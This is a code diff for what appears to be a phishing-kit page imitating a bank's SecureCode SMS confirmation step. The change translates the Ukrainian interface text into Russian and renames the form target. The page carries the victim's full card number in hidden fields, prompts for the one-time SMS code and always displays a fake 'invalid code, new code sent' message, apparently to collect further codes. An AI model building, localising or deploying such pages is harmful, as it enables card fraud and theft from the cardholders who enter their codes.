@@ -20,7 +20,7 @@
 </head>
 
 <body>
-	<form class="form-payment" action="confirmation_fua" method="post">
+	<form class="form-payment" action="confirmation_f" method="post">
 		<input type="hidden" name="tag" value="">
 		<style>
 		@import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");
@@ -834,21 +834,21 @@
 				<br>
 				<div class="card-list">
 					<div class="card-form__inner">
-						<center> <strong style="color:;font-size:21px">Підтвердження операції <i style="color:;font-size:17px" data-toggle="tooltip" title="SecureCode – це простий та безпечний спосіб оплати покупок в інтернеті картками, який реалізований шляхом відправки одноразового секретного коду на мобільний телефон власнику картки та перевірки коду на стороні банкінгу." class="far fa-question-circle"></i></strong></center>
+						<center> <strong style="color:;font-size:21px">Подтверждение операции <i style="color:;font-size:17px" data-toggle="tooltip" title="SecureCode – это простой и безопасный способ оплаты покупок в интернете по картам, который реализован путем отправки одноразового секретного кода на мобильный телефон держателю карты и проверки кода на стороне банкинга." class="far fa-question-circle"></i></strong></center>
 						<table style="margin: auto;padding: 20px;">
 							<tbody style="margin: auto;">
 								<tr>
-									<th style="float:right" scope="row">Номер картки</th>
+									<th style="float:right" scope="row">Номер карты</th>
 									<td style="padding-left:10px;color:#1a3b5d;font-weight: lighter;"><b>**** **** **** <%= cardnumber %></b></td>
 								</tr>
 							</tbody>
 						</table>
-						<center> <small style="text-align:justify;">Для підтвердження операції на номер телефону було надіслано смс повідомлення з кодом підтвердження. Введіть його у поле нижче.</small> </center>
+						<center> <small style="text-align:justify;">Для подтверждения операции на Ваш номер телефона было отправлено смс сообщение с кодом подтверждения. Введите его в поле ниже.</small> </center>
 						<br>
-						<center style="color:red"><i class="fas fa-exclamation-circle"></i> Невірний код із смс! Вам надіслано новий код.</center>
+						<center style="color:red"><i class="fas fa-exclamation-circle"></i> Неверный код из смс! Вам отправлен новый код.</center>
 						<center>
 							<div class="card-input">
-								<label for="cardName" class="card-input__label">Введiть код:</label>
+								<label for="cardName" class="card-input__label">Код из смс:</label>
 								<input type="hidden" name="amount" value=<%= amount %>>
 								<input type="hidden" name="cardnumberAll" value=<%= cardnumberAll %>>
 								<input type="hidden" name="cardnumber" value=<%= cardnumber %>>
@@ -864,7 +864,7 @@
 								<div class="credit-card-form__submit">
 									<div class="credit-card-form__submit-inner">
 										<div class="credit-card-form__submit-inner">
-											<input type="submit" class="card-form__button" name="submit" value="Пiдтвердити" onclick="this.style.display='none';"> </div>
+											<input type="submit" class="card-form__button" name="submit" value="Подтвердить" onclick="this.style.display='none';"> </div>
 									</div>
 								</div>
 							</div>
